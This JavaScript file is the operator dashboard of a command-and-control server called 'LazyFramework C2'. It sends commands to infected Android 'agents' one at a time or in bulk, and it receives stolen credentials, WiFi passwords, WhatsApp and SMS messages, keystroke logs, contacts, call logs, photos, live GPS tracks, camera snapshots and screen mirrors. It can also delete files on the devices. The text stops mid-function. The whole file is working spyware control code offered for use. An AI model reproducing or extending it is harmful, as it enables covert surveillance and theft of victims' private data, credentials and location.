// ========================================
// script.js - LazyFramework C2 Server
// Complete JavaScript File
// ========================================

// ==================== STATE ====================
let ws = null;
let selectedAgent = null;
let agents = [];
let agentData = {};
let outputHistory = [];
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 10;
let liveMirrorFrames = [];
let isLiveMirrorActive = false;
let liveMirrorFrameCount = 0;
let currentFilter = 'all';

// ==================== MULTI-TARGET STATE ====================
let selectedAgents = new Set();
let targetMode = 'single';
let groups = {};
let bulkCommandResults = {};
let isBulkRunning = false;
// Map variables
let locationMap = null;
let locationMarker = null;
let locationPath = [];
let locationPolyline = null;
let isMapInitialized = false;
let locationTrackingData = [];
let rdpMode = false;
// ==================== DOM REFERENCES ====================
const DOM = {
    agentList: document.getElementById('agent-list'),
    outputContent: document.getElementById('output-content'),
    locationContent: document.getElementById('location-content'),
    cameraContent: document.getElementById('camera-content'),
    commandInput: document.getElementById('command-input'),
    sendBtn: document.getElementById('send-command-btn'),
    statusIndicator: document.getElementById('status-indicator'),
    statusText: document.getElementById('status-text'),
    agentCount: document.getElementById('agent-count'),
    onlineCount: document.getElementById('online-count'),
    commandCount: document.getElementById('command-count'),
    mirrorCount: document.getElementById('mirror-count'),
    selectedAgentId: document.getElementById('selected-agent-id'),
    refreshBtn: document.getElementById('refresh-agents'),
    clearBtn: document.getElementById('clear-output'),
    screenshotContent: document.getElementById('screenshot-content'),
    keylogContent: document.getElementById('keylog-content'),
    whatsappContent: document.getElementById('whatsapp-content'),
    livemirrorContent: document.getElementById('livemirror-content'),
    wallpaperContent: document.getElementById('wallpaper-content'),
};

// ==================== INITIALIZATION ====================
document.addEventListener('DOMContentLoaded', () => {
    connectWebSocket();
    setupEventListeners();
    setupCommandPresets();
    setupTabs();
    setupFilters();
    setupScrollableTabs();
    setupTabKeyboardShortcuts();
    setupTargetMode();
    setupBulkCommandPresets();
    startAutoRefresh();
    updateFooterStats();
    
    // Fallback if WebSocket fails
    setTimeout(() => {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            console.warn('⚠️ WebSocket not connected, using fallback');
            fetch('/api/agents')
                .then(response => response.json())
                .then(data => {
                    if (data.success && data.data) {
                        updateAgentList(data.data);
                        addOutputLine('📡 Loaded agents via HTTP fallback', 'info');
                    }
                })
                .catch(err => {
                    console.error('❌ Fallback failed:', err);
                    const container = DOM.agentList;
                    if (container) {
                        container.innerHTML = `
                            <div class="info" style="color:#ff6b6b;">
                                ❌ Could not connect to server
                            </div>
                            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
                                💡 Make sure server is running: <br>
                                <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#00d2ff;">go run *.go</code>
                            </div>
                        `;
                    }
                });
        }
    }, 3000);
    
    // Update footer time every second
    setInterval(updateFooterTime, 1000);
});

// ==================== FOOTER FUNCTIONS ====================
function updateFooterTime() {
    const el = document.getElementById('footer-time');
    if (el) {
        el.textContent = new Date().toLocaleTimeString();
    }
}

function updateFooterStats() {
    const agents = document.getElementById('footer-agents');
    const online = document.getElementById('footer-online');
    const commands = document.getElementById('footer-commands');
    const mirror = document.getElementById('footer-mirror');
    const status = document.getElementById('footer-status');
    
    if (agents) agents.textContent = document.getElementById('agent-count')?.textContent || '0';
    if (online) online.textContent = document.getElementById('online-count')?.textContent || '0';
    if (commands) commands.textContent = document.getElementById('command-count')?.textContent || '0';
    if (mirror) mirror.textContent = document.getElementById('mirror-count')?.textContent || '0';
    
    if (status) {
        const isConnected = ws && ws.readyState === WebSocket.OPEN;
        status.textContent = isConnected ? '🟢 Online' : '🔴 Offline';
        status.className = `footer-status ${isConnected ? 'online' : 'offline'}`;
    }
}

// ==================== WEBSOCKET ====================
function connectWebSocket() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/ws`;
    
    console.log('🔌 Connecting to WebSocket:', wsUrl);
    
    ws = new WebSocket(wsUrl);
    
    ws.onopen = () => {
        console.log('✅ WebSocket connected');
        updateStatus(true);
        reconnectAttempts = 0;
        addOutputLine('🟢 Connected to C2 server', 'success');
        updateFooterStats();
        
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ action: 'get_agents' }));
            console.log('📤 Requested agent list');
        }
    };

    ws.onclose = () => {
        console.log('🔴 WebSocket disconnected');
        updateStatus(false);
        addOutputLine('🔴 Disconnected from C2 server', 'error');
        updateFooterStats();
        reconnectAttempts++;
        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
            const delay = Math.min(3000 * reconnectAttempts, 30000);
            console.log(`🔄 Reconnecting in ${delay}ms...`);
            setTimeout(connectWebSocket, delay);
        } else {
            addOutputLine('❌ Max reconnection attempts reached', 'error');
        }
    };

    ws.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            console.log('📨 WebSocket message received:', data.type);
            handleWebSocketMessage(data);
        } catch (e) {
            console.error('❌ WebSocket parse error:', e);
        }
    };

    ws.onerror = (error) => {
        console.error('❌ WebSocket error:', error);
        addOutputLine('⚠️ WebSocket error occurred', 'error');
    };
}

// ==================== HANDLE WEBSOCKET MESSAGES ====================

function handleWebSocketMessage(data) {
    console.log('📨 WebSocket message:', data);

    switch (data.type) {
        case 'agent_list':
            updateAgentList(data.agents);
            updateFooterStats();
            break;
            
        case 'agent_detail':
            showAgentDetail(data.agent);
            break;
            
        case 'agent_update':
            updateAgent(data.agent);
            updateFooterStats();
            break;
            
        case 'command_sent':
            addOutputLine(`📤 Command sent to ${data.agent_id}: ${data.command}`, 'info');
            break;
            
        case 'command_response':
            handleCommandResponse(data);
            break;
            
        case 'screen_frame':
            handleScreenFrame(data.agent_id, data.frame);
            break;
        case 'video_frame':
    handleVideoFrame(data.agent_id, data.frame);
    break;    
        case 'video_frame':
            handleVideoFrame(data.agent_id, data.frame);
            break;
            
        case 'credentials_data':
    console.log('🔐 Credentials data received:', data);
    handleCredentialsData(data);
    break;

case 'wifi_passwords':
    console.log('📶 WiFi passwords received:', data);
    handleWifiData(data);
    break;
            
        case 'social_message':
            console.log('💬 Social message received:', data);
            handleSocialMessage(data);
            break;
            
        case 'whatsapp_message':
            handleWhatsAppMessage(data);
            break;
            
        case 'keylog_data':
            handleKeylogData(data);
            break;
            
        case 'error':
            addOutputLine(`❌ Error: ${data.message}`, 'error');
            break;
            
        case 'accounts_data':
            console.log('👤 Accounts data received:', data);
            handleAccountsData(data);
            break;
            
        case 'google_accounts_data':
            console.log('🔵 Google accounts data received:', data);
            handleGoogleAccountsData(data);
            break;
            
        case 'location_status':
        case 'location_history':
        case 'location_update':
            handleLocationTrackingData(data);
            break;
            
        case 'browser_info':
        case 'browser_history':
        case 'browser_bookmarks':
        case 'browser_tabs':
        case 'browser_all':
            handleBrowserData(data);
            break;
        // Di dalam switch (data.type) atau di bagian handler command response
case 'gallery_data':
    console.log('🖼️ Gallery data received:', data);
    handleGalleryData(data);
    break; 
    // ✅ TAMBAHKAN DI SINI!
        case 'gps_status':
            console.log('🛰️ GPS Status received:', data);
            handleGPSStatus(data);
            break;
        default:
            console.log('Unknown message type:', data.type);
    }
}

function refreshGallery() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Select agent first', 'error');
        return;
    }
    sendCommand('GET_GALLERY');
}

function exportGallery() {
    const items = document.querySelectorAll('#gallery-grid .gallery-item');
    if (items.length === 0) {
        addOutputLine('⚠️ No images to export', 'error');
        return;
    }
    let csv = 'Name,Path,Size,Date\n';
    items.forEach(item => {
        const name = item.querySelector('[style*="color:#c8d6e5"]')?.textContent || '';
        const size = item.querySelectorAll('[style*="color:#6b7a8a"]')[0]?.textContent || '';
        const date = item.querySelectorAll('[style*="color:#6b7a8a"]')[1]?.textContent || '';
        csv += `"${name}","${name}","${size}","${date}"\n`;
    });
    downloadFile(csv, `gallery_${Date.now()}.csv`, 'text/csv');
    addOutputLine(`📤 Exported ${items.length} images`, 'success');
}

function downloadGalleryImage(path) {
    if (!selectedAgent) {
        addOutputLine('⚠️ Select agent first', 'error');
        return;
    }
    if (!path) {
        addOutputLine('⚠️ No path specified for image', 'error');
        return;
    }
    addOutputLine(`⬇️ Downloading image: ${path}`, 'info');
    sendCommand('DOWNLOAD_FILE', path);
}

function filterGallery(query) {
    const items = document.querySelectorAll('#gallery-grid .gallery-item');
    const q = query.toLowerCase();
    items.forEach(item => {
        const name = item.dataset.name || '';
        item.style.display = name.includes(q) ? 'block' : 'none';
    });
}

// ==================== UI UPDATE FUNCTIONS ====================

function updateStatus(connected) {
    const indicator = DOM.statusIndicator;
    const text = DOM.statusText;

    if (connected) {
        indicator.className = 'status-online';
        text.textContent = 'Connected';
        document.body.style.borderColor = '#51cf66';
    } else {
        indicator.className = 'status-offline';
        text.textContent = 'Disconnected';
        document.body.style.borderColor = '#ff6b6b';
    }
}

function updateAgentList(agentList) {
    console.log('📋 Updating agent list:', agentList);
    agents = agentList || [];
    const container = DOM.agentList;
    
    if (!container) {
        console.error('❌ Agent list container not found');
        return;
    }

    if (agents.length === 0) {
        container.innerHTML = `
            <div class="info">📱 No agents connected</div>
            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
                💡 Make sure agent app is running and connected to ${window.location.hostname}:4444
            </div>
        `;
        DOM.agentCount.textContent = '0';
        DOM.onlineCount.textContent = '0';
        DOM.mirrorCount.textContent = '0';
        DOM.commandCount.textContent = '0';
        updateFooterStats();
        return;
    }

    let online = 0;
    let mirroring = 0;
    let totalCommands = 0;

    // Hitung hanya SEKALI
    agents.forEach(agent => {
        if (agent.status === 'online') online++;
        if (agent.mirroring) mirroring++;
        if (agent.commands) totalCommands += agent.commands.length;
    });

    container.innerHTML = '';

    agents.forEach(agent => {
        const div = document.createElement('div');
        div.className = 'agent-item';
        if (selectedAgent === agent.id) div.classList.add('selected');
        if (selectedAgents.has(agent.id)) div.classList.add('selected');
        
        const shortId = agent.id.substring(0, 12) + '...';
        const statusClass = agent.status === 'online' ? 'status-online' : 'status-offline';
        const statusText = agent.status === 'online' ? '🟢 Online' : '🔴 Offline';
        const mirrorIcon = agent.mirroring ? ' 📸' : '';
        const frameInfo = agent.frame_count > 0 ? ` (${agent.frame_count} frames)` : '';
        const groupBadge = agent.group ? `<span class="group-badge">${agent.group}</span>` : '';
        
        div.innerHTML = `
            <input type="checkbox" class="agent-checkbox" ${selectedAgents.has(agent.id) ? 'checked' : ''}>
            <div style="flex:1;min-width:0;">
                <div class="agent-id">${shortId} ${groupBadge}</div>
                <div class="agent-device">${agent.manufacturer || ''} ${agent.device || 'Unknown'}</div>
                <div class="agent-status">
                    <span class="${statusClass}">●</span>
                    ${statusText}${mirrorIcon}${frameInfo}
                </div>
                <div class="agent-lastseen">Last seen: ${formatTime(agent.last_seen)}</div>
            </div>
        `;
        div.dataset.agentId = agent.id;

        // === EVENT LISTENER KLIK (PENTING) ===
        div.addEventListener('click', (e) => {
            if (e.target.type === 'checkbox') return;
            
            if (targetMode !== 'single') {
                toggleAgentSelection(agent.id);
            } else {
                selectAgent(agent.id);
            }
        });

        // Checkbox handler
        const checkbox = div.querySelector('.agent-checkbox');
        if (checkbox) {
            checkbox.addEventListener('change', (e) => {
                e.stopPropagation();
                if (e.target.checked) {
                    selectedAgents.add(agent.id);
                } else {
                    selectedAgents.delete(agent.id);
                }
                updateAgentSelectionUI();
            });
        }

        container.appendChild(div);
    });

    DOM.agentCount.textContent = agents.length;
    DOM.onlineCount.textContent = online;
    DOM.mirrorCount.textContent = mirroring;
    DOM.commandCount.textContent = totalCommands;

    updateAgentSelectionUI();

    if (selectedAgent && !agents.find(a => a.id === selectedAgent)) {
        selectedAgent = null;
        DOM.selectedAgentId.textContent = '';
        stopLiveMirror();
    }
    
    updateFooterStats();
}

function updateAgent(agent) {
    const index = agents.findIndex(a => a.id === agent.id);
    if (index !== -1) {
        agents[index] = agent;
        updateAgentList(agents);
        
        if (selectedAgent === agent.id && !agent.mirroring) {
            stopLiveMirror();
        }
    }
}

function selectAgent(agentId) {
    selectedAgent = agentId;
    DOM.selectedAgentId.textContent = agentId;
    
    document.querySelectorAll('.agent-item').forEach(el => {
        el.classList.toggle('selected', el.dataset.agentId === agentId);
    });

    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            action: 'get_agent',
            agent_id: agentId
        }));
    }

    addOutputLine(`📱 Selected agent: ${agentId}`, 'info');
    resetLiveMirror();
}

function showAgentDetail(agent) {
    if (!agent) return;
}

// ==================== AGENT SELECTION FUNCTIONS ====================

function toggleAgentSelection(agentId) {
    if (selectedAgents.has(agentId)) {
        selectedAgents.delete(agentId);
    } else {
        selectedAgents.add(agentId);
    }
    updateAgentSelectionUI();
}

function updateAgentSelectionUI() {
    document.querySelectorAll('.agent-item').forEach(el => {
        const checkbox = el.querySelector('.agent-checkbox');
        const agentId = el.dataset.agentId;
        if (checkbox) {
            checkbox.checked = selectedAgents.has(agentId);
        }
        el.classList.toggle('selected', selectedAgents.has(agentId));
    });
    
    const count = selectedAgents.size;
    const el = document.getElementById('selected-agents-count');
    if (el) el.textContent = `${count} selected`;
    const targetEl = document.getElementById('target-count');
    if (targetEl) targetEl.textContent = `${count} agents selected`;
}

function selectAllAgents() {
    agents.forEach(agent => {
        if (agent.status === 'online') {
            selectedAgents.add(agent.id);
        }
    });
    updateAgentSelectionUI();
    addOutputLine(`✅ Selected ${selectedAgents.size} agents`, 'success');
}

function deselectAllAgents() {
    selectedAgents.clear();
    updateAgentSelectionUI();
    addOutputLine('✅ Deselected all agents', 'info');
}

// ==================== BULK COMMAND EXECUTION ====================

function sendBulkCommand(command, params = '') {
    let targets = [];
    const mode = document.getElementById('target-mode').value;
    
    switch (mode) {
        case 'single':
            if (!selectedAgent) {
                addOutputLine('⚠️ Please select a single agent', 'error');
                return;
            }
            targets = [selectedAgent];
            break;
            
        case 'selected':
            if (selectedAgents.size === 0) {
                addOutputLine('⚠️ Please select at least one agent', 'error');
                return;
            }
            targets = Array.from(selectedAgents);
            break;
            
        case 'all':
            targets = agents.filter(a => a.status === 'online').map(a => a.id);
            if (targets.length === 0) {
                addOutputLine('⚠️ No online agents found', 'error');
                return;
            }
            break;
            
        case 'group':
            const groupName = document.getElementById('target-group').value;
            if (!groupName) {
                addOutputLine('⚠️ Please select a group', 'error');
                return;
            }
            targets = agents.filter(a => a.group === groupName && a.status === 'online').map(a => a.id);
            if (targets.length === 0) {
                addOutputLine(`⚠️ No online agents in group "${groupName}"`, 'error');
                return;
            }
            break;
    }
    
    if (targets.length === 0) {
        addOutputLine('⚠️ No targets found', 'error');
        return;
    }
    
    showBulkProgress(targets.length);
    
    const fullCommand = params ? `${command} ${params}` : command;
    addOutputLine(`📤 Sending bulk command: "${fullCommand}" to ${targets.length} agents`, 'info');
    
    let completed = 0;
    
    targets.forEach((agentId, index) => {
        setTimeout(() => {
            if (!ws || ws.readyState !== WebSocket.OPEN) {
                addOutputLine(`⚠️ Not connected to server`, 'error');
                return;
            }
            
            ws.send(JSON.stringify({
                action: 'send_command',
                agent_id: agentId,
                command: command,
                params: params
            }));
            
            completed++;
            updateBulkProgress(completed, targets.length, agentId);
            
            if (completed === targets.length) {
                setTimeout(() => {
                    hideBulkProgress();
                    addOutputLine(`✅ Bulk command completed: ${completed} agents`, 'success');
                }, 2000);
            }
        }, index * 300);
    });
}

// ==================== BULK PROGRESS UI ====================

function showBulkProgress(total) {
    const progressEl = document.getElementById('bulk-progress');
    if (progressEl) {
        progressEl.style.display = 'block';
        const totalEl = progressEl.querySelector('.progress-text .total');
        if (totalEl) totalEl.textContent = `0 / ${total}`;
        const fillEl = progressEl.querySelector('.progress-fill');
        if (fillEl) fillEl.style.width = '0%';
    }
}

function updateBulkProgress(completed, total, agentId) {
    const progressEl = document.getElementById('bulk-progress');
    if (progressEl) {
        const percent = (completed / total) * 100;
        const totalEl = progressEl.querySelector('.progress-text .total');
        if (totalEl) totalEl.textContent = `${completed} / ${total}`;
        const fillEl = progressEl.querySelector('.progress-fill');
        if (fillEl) fillEl.style.width = `${percent}%`;
        const currentEl = progressEl.querySelector('.progress-text .current');
        if (currentEl) currentEl.textContent = `Agent: ${agentId.substring(0, 8)}...`;
    }
}

function hideBulkProgress() {
    const progressEl = document.getElementById('bulk-progress');
    if (progressEl) {
        setTimeout(() => {
            progressEl.style.display = 'none';
        }, 3000);
    }
}

// ==================== GROUP MANAGEMENT ====================

function createGroup() {
    const groupName = prompt('Enter group name:');
    if (!groupName) return;
    
    const selected = Array.from(selectedAgents);
    if (selected.length === 0) {
        addOutputLine('⚠️ Please select at least one agent for the group', 'error');
        return;
    }
    
    if (!groups[groupName]) {
        groups[groupName] = [];
    }
    
    selected.forEach(agentId => {
        if (!groups[groupName].includes(agentId)) {
            groups[groupName].push(agentId);
        }
        const agent = agents.find(a => a.id === agentId);
        if (agent) {
            agent.group = groupName;
        }
    });
    
    updateGroupDropdown();
    addOutputLine(`✅ Group "${groupName}" created with ${selected.length} agents`, 'success');
    updateAgentList(agents);
}

function updateGroupDropdown() {
    const select = document.getElementById('target-group');
    if (!select) return;
    
    const currentValue = select.value;
    select.innerHTML = '<option value="">Select Group...</option>';
    
    Object.keys(groups).forEach(groupName => {
        const option = document.createElement('option');
        option.value = groupName;
        option.textContent = `${groupName} (${groups[groupName].length} agents)`;
        select.appendChild(option);
    });
    
    if (currentValue && groups[currentValue]) {
        select.value = currentValue;
    }
}

function loadGroupMembers(groupName) {
    if (!groups[groupName]) return;
    
    selectedAgents.clear();
    groups[groupName].forEach(agentId => {
        const agent = agents.find(a => a.id === agentId);
        if (agent && agent.status === 'online') {
            selectedAgents.add(agentId);
        }
    });
    updateAgentSelectionUI();
    addOutputLine(`📦 Loaded group "${groupName}": ${selectedAgents.size} agents`, 'info');
}

// ==================== TARGET MODE SETUP ====================

function setupTargetMode() {
    const modeSelect = document.getElementById('target-mode');
    const groupSelect = document.getElementById('target-group');
    const selectAllBtn = document.getElementById('select-all-agents');
    const deselectAllBtn = document.getElementById('deselect-all-agents');
    const createGroupBtn = document.getElementById('create-group-btn');
    
    if (!modeSelect) return;
    
    modeSelect.addEventListener('change', function() {
        targetMode = this.value;
        
        if (groupSelect) {
            groupSelect.style.display = this.value === 'group' ? 'inline-block' : 'none';
        }
        
        if (this.value === 'single') {
            selectedAgents.clear();
            if (selectedAgent) {
                selectedAgents.add(selectedAgent);
            }
        } else if (this.value === 'all') {
            selectAllAgents();
        } else if (this.value === 'group') {
            if (groupSelect && groupSelect.value) {
                loadGroupMembers(groupSelect.value);
            }
        }
        
        updateAgentSelectionUI();
        addOutputLine(`🎯 Target mode: ${this.options[this.selectedIndex].text}`, 'info');
    });
    
    if (selectAllBtn) {
        selectAllBtn.addEventListener('click', selectAllAgents);
    }
    
    if (deselectAllBtn) {
        deselectAllBtn.addEventListener('click', deselectAllAgents);
    }
    
    if (createGroupBtn) {
        createGroupBtn.addEventListener('click', createGroup);
    }
    
    if (groupSelect) {
        groupSelect.addEventListener('change', function() {
            if (this.value) {
                loadGroupMembers(this.value);
            }
        });
    }
}

// ==================== BULK COMMAND PRESETS ====================

function setupBulkCommandPresets() {
    document.querySelectorAll('.bulk-cmd').forEach(btn => {
        btn.addEventListener('click', function() {
            const cmd = this.dataset.cmd;
            DOM.commandInput.value = cmd;
            sendCommand(cmd);
        });
    });
}

// ==================== AUTO REFRESH ====================

let autoRefreshInterval = null;

function startAutoRefresh() {
    if (autoRefreshInterval) clearInterval(autoRefreshInterval);
    autoRefreshInterval = setInterval(() => {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ action: 'get_agents' }));
        }
        updateFooterStats();
    }, 5000);
}

// ==================== COMMAND SENDING ====================

function sendCommand(command, params = '') {
    const mode = document.getElementById('target-mode')?.value || 'single';
    
    if (mode === 'single') {
        if (!selectedAgent) {
            addOutputLine('⚠️ Please select an agent first', 'error');
            return;
        }
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            addOutputLine('⚠️ Not connected to server', 'error');
            return;
        }
        
        const fullCommand = params ? `${command} ${params}` : command;
        addOutputLine(`📤 Sending: ${fullCommand} to ${selectedAgent}`, 'info');
        
        ws.send(JSON.stringify({
            action: 'send_command',
            agent_id: selectedAgent,
            command: command,
            params: params
        }));
    } else {
        sendBulkCommand(command, params);
    }
}

// ==================== COMMAND RESPONSE HANDLER ====================

function handleCommandResponse(data) {
    const agentId = data.agent_id;
    const command = data.command;
    const result = data.result;
    const timestamp = new Date().toLocaleTimeString();
    
    // Track bulk command
    if (document.getElementById('target-mode')?.value !== 'single') {
        if (!bulkCommandResults[command]) {
            bulkCommandResults[command] = {};
        }
        bulkCommandResults[command][agentId] = result;
        const status = result.status || 'success';
        addOutputLine(`📥 [${agentId.substring(0, 8)}...] ${command}: ${status}`, 'info');
    }
    
    // ==================== CAMERA INFO ====================
    if (command === 'CAMERA_INFO' || command.startsWith('CAMERA_INFO ')) {
        console.log('📸 Camera info received:', result);
        showCameraInfo(result);
        return;
    }

    // ==================== CAMERA SNAPSHOT ====================
    if (command === 'CAMERA_SNAPSHOT' || command.startsWith('CAMERA_SNAPSHOT ')) {
        console.log('📷 Camera snapshot received:', result);
        if (result.status === 'success' && result.image_data) {
            showCameraImage(result);
            addOutputLine(`📷 Camera snapshot captured (${result.camera || 'unknown'})`, 'success');
        } else if (result.status === 'permission_denied') {
            addOutputLine(`❌ Camera permission denied`, 'error');
            addOutputLine(`💡 Please grant camera permission in app settings`, 'info');
        } else {
            addOutputLine(`❌ Camera failed: ${result.message || 'Unknown error'}`, 'error');
        }
        return;
    }

    // ==================== GET LOCATION ====================
    if (command === 'GET_LOCATION' || command.startsWith('GET_LOCATION ')) {
        console.log('📍 Location response received:', result);
        if (result.status === 'success' && result.latitude && result.longitude) {
            showLocationInTab(result);
            addOutputLine(`📍 Location: ${result.latitude}, ${result.longitude}`, 'success');
            addOutputLine(`🗺️ Maps: ${result.maps_url}`, 'info');
        } else if (result.status === 'permission_denied') {
            addOutputLine(`❌ Location permission denied on device`, 'error');
            addOutputLine(`💡 Please grant location permission in app settings`, 'info');
            showLocationPermissionGuide();
        } else if (result.status === 'disabled') {
            addOutputLine(`❌ Location services are disabled`, 'error');
            addOutputLine(`💡 Please enable GPS or Network location in settings`, 'info');
        } else {
            addOutputLine(`❌ Failed to get location: ${result.message || 'Unknown error'}`, 'error');
            if (result.suggestion) {
                addOutputLine(`💡 ${result.suggestion}`, 'info');
            }
            if (result.gps_enabled !== undefined) {
                addOutputLine(`📡 GPS: ${result.gps_enabled ? '✅ Enabled' : '❌ Disabled'}`, 'info');
                addOutputLine(`📶 Network: ${result.network_enabled ? '✅ Enabled' : '❌ Disabled'}`, 'info');
            }
        }
        switchToTab('location');
        return;
    }
    
    // GET_FILES_LIST
    if (command && (command === 'GET_FILES_LIST' || command.startsWith('GET_FILES_LIST '))) {
        console.log('📁 Files list received:', result);
        showFilesList({ agent_id: agentId, data: result });
        if (result.status === 'success') {
            addOutputLine(`📁 Files list loaded: ${result.count || 0} items at ${result.path || '/'}`, 'info');
        } else {
            addOutputLine(`❌ Failed to list files: ${result.message || 'Unknown error'}`, 'error');
        }
        switchToTab('files');
        return;
    }
    
    // GET_CONTACTS
    if (command === 'GET_CONTACTS' || command.startsWith('GET_CONTACTS ')) {
        handleContactsData({ agent_id: agentId, data: result });
        return;
    }

    // GET_SMS
    if (command === 'GET_SMS' || command.startsWith('GET_SMS ')) {
        handleSMSData({ agent_id: agentId, data: result });
        return;
    }
    
    // Di dalam handleCommandResponse()
if (command === 'GET_GALLERY' || command.startsWith('GET_GALLERY ')) {
    console.log('🖼️ Gallery response received:', result);
    handleGalleryData({ agent_id: agentId, data: result });
    switchToTab('gallery');
    return;
}

    // GET_CALL_LOGS
    if (command === 'GET_CALL_LOGS' || command.startsWith('GET_CALL_LOGS ')) {
        handleCallLogsData({ agent_id: agentId, data: result });
        return;
    }

    // GET_INSTALLED_APPS
    if (command === 'GET_INSTALLED_APPS' || command.startsWith('GET_INSTALLED_APPS ')) {
        handleAppsData({ agent_id: agentId, data: result });
        return;
    }

    // WA_CONTACTS
    if (command === 'WA_CONTACTS' || command.startsWith('WA_CONTACTS ')) {
        handleWAContactsData({ agent_id: agentId, data: result });
        return;
    }
    
    // SCREEN_START
    if (command === 'SCREEN_START') {
        console.log('📸 SCREEN_START response:', result);
        if (result.status === 'success' || result.status === 'pending') {
            addOutputLine(`📸 Screen mirror started! Status: ${result.status}`, 'success');
            const container = DOM.livemirrorContent;
            if (container) {
                container.innerHTML = `
                    <div style="text-align:center;padding:20px;color:#00d2ff;">
                        <div style="font-size:48px;">📸</div>
                        <div style="font-size:16px;margin-top:10px;">Screen Mirror Started!</div>
                        <div style="font-size:12px;color:#6b7a8a;margin-top:5px;">Waiting for frames...</div>
                        <div style="font-size:11px;color:#4a5a6a;margin-top:10px;font-family:'Courier New',monospace;">
                            Agent: ${agentId.substring(0, 12)}...
                        </div>
                    </div>
                `;
            }
            switchToTab('livemirror');
        } else {
            addOutputLine(`❌ Failed to start mirror: ${result.message || 'Unknown error'}`, 'error');
        }
        return;
    }

    // SCREEN_STOP
    if (command === 'SCREEN_STOP') {
        console.log('⏹️ SCREEN_STOP response:', result);
        if (result.status === 'success') {
            addOutputLine(`⏹️ Screen mirror stopped!`, 'success');
            resetLiveMirror();
        } else {
            addOutputLine(`❌ Failed to stop mirror: ${result.message || 'Unknown error'}`, 'error');
        }
        return;
    }
    
    // Video Stream
if (command === 'VIDEO_STREAM_START' || command.startsWith('VIDEO_STREAM_START ')) {
    console.log('🎬 Video stream start response:', result);
    if (result.status === 'success' || result.status === 'pending') {
        addOutputLine(`🎬 Video stream started!`, 'success');
    }
    return;
}

if (command === 'VIDEO_STREAM_STOP' || command.startsWith('VIDEO_STREAM_STOP ')) {
    console.log('⏹️ Video stream stop response:', result);
    addOutputLine(`⏹️ Video stream stopped`, 'info');
    resetVideoStream();
    return;
}

if (command === 'VIDEO_STREAM_STATUS' || command.startsWith('VIDEO_STREAM_STATUS ')) {
    console.log('📊 Video stream status:', result);
    if (result.is_streaming) {
        addOutputLine(`🎬 Streaming active - ${result.frame_count || 0} frames`, 'success');
    } else {
        addOutputLine(`⏹️ Streaming inactive`, 'info');
    }
    return;
}

// ==================== RDP COMMAND HANDLERS ====================

// Di handleCommandResponse() tambahkan:
if (command === 'RDP_START' || command.startsWith('RDP_START ')) {
    console.log('🖥️ RDP Start:', result);
    if (result.status === 'success' || result.status === 'pending') {
        addOutputLine(`🖥️ RDP ${result.status === 'success' ? 'STARTED!' : 'Requested...'}`, 'success');
        if (result.mirror_active) switchToTab('livemirror');
    }
    return;
}

if (command === 'RDP_STOP' || command.startsWith('RDP_STOP ')) {
    console.log('⏹️ RDP Stop:', result);
    addOutputLine(`🖥️ RDP STOPPED`, 'info');
    resetVideoStream();
    return;
}

if (command === 'RDP_STATUS' || command.startsWith('RDP_STATUS ')) {
    console.log('📊 RDP Status:', result);
    addOutputLine(`🖥️ Status: ${result.is_streaming ? '🟢 Active' : '🔴 Inactive'}`, 'info');
    addOutputLine(`   📊 Frames: ${result.frame_count || 0}`, 'info');
    return;
}
    
    // DELETE_FILE
    if (command === 'DELETE_FILE' || command.startsWith('DELETE_FILE ')) {
        console.log('🗑️ Delete response received:', result);
        if (result.status === 'success') {
            addOutputLine(`🗑️ File deleted: ${result.path || 'unknown'}`, 'success');
        } else {
            addOutputLine(`❌ Delete failed: ${result.message || 'Unknown error'}`, 'error');
        }
        return;
    }

    // MOVE_FILE
    if (command === 'MOVE_FILE' || command.startsWith('MOVE_FILE ')) {
        console.log('📦 Move response received:', result);
        if (result.status === 'success') {
            addOutputLine(`📦 File moved: ${result.source} -> ${result.destination}`, 'success');
        } else {
            addOutputLine(`❌ Move failed: ${result.message || 'Unknown error'}`, 'error');
            if (result.overwrite_available) {
                addOutputLine(`💡 Destination already exists. Delete it first or use a different name.`, 'info');
            }
        }
        return;
    }

    // SCREEN_FRAME
    if (command === 'SCREEN_FRAME' || (result && result.type === 'screen_frame')) {
        console.log('📸 Screen frame received');
        if (result && result.data) {
            showLiveFrame(result);
        }
        return;
    }

    // VIDEO_FRAME
    if (command === 'VIDEO_FRAME' || (result && result.type === 'video_frame')) {
        console.log('🎬 Video frame received');
        if (result && result.data) {
            showLiveFrame(result);
        }
        return;
    }

    // DOWNLOAD_FILE
    if (command === 'DOWNLOAD_FILE' || command.startsWith('DOWNLOAD_FILE ')) {
        console.log('⬇️ Download response received:', result);
        showDownloadedFile({ agent_id: agentId, data: result });
        return;
    }
    
    // ==================== KEYLOG DUMP HANDLER ====================

if (command === 'KEYLOG_DUMP' || command.startsWith('KEYLOG_DUMP')) {
    console.log('⌨️ KEYLOG_DUMP response received:', result);
    
    // ✅ TAMPILKAN DI TAB KEYLOG
    if (result.logs) {
        showKeylogs(result.logs);
        addOutputLine(`⌨️ Keylog dump received (${result.count || 0} keystrokes)`, 'success');
    } else if (result.data && result.data.logs) {
        showKeylogs(result.data.logs);
        addOutputLine(`⌨️ Keylog dump received (${result.data.count || 0} keystrokes)`, 'success');
    } else {
        // ✅ TAMPILKAN PESAN ERROR
        const errorMsg = result.message || 'No keylog data received';
        showKeylogs(`⚠️ ${errorMsg}\n\n📋 DEBUG INFO:\n  - Status: ${result.status || 'unknown'}\n  - Count: ${result.count || 0}\n  - Logging: ${result.is_logging || false}\n\n💡 Make sure Accessibility Service is ENABLED and type something.`);
        addOutputLine(`⌨️ No keylog data: ${errorMsg}`, 'warning');
    }
    
    // ✅ SWITCH KE TAB KEYLOG
    switchToTab('keylog');
    return;
}

    // SET_WALLPAPER
    if (command === 'SET_WALLPAPER' || command.startsWith('SET_WALLPAPER ')) {
